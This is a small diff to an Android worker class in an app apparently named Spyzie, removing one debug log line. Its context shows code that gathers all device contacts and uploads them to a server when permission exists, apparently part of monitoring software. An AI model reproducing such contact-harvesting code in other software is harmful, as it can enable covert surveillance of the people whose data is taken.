@@ -41,8 +41,6 @@ public class GetContactsWorker extends Worker {
     public Result doWork() {
         SpyzieApplication.getInstance().getServiceComponent().inject(this);
 
-        Log.d(Constants.LOG_TAG + "G", "GetContactsWorkder, instance=" + this);
-
         if (CommonUtils.hasContactPermission(getApplicationContext())) {
             mApiManager.sendContactsData(getAllContacts());
             return Result.success();
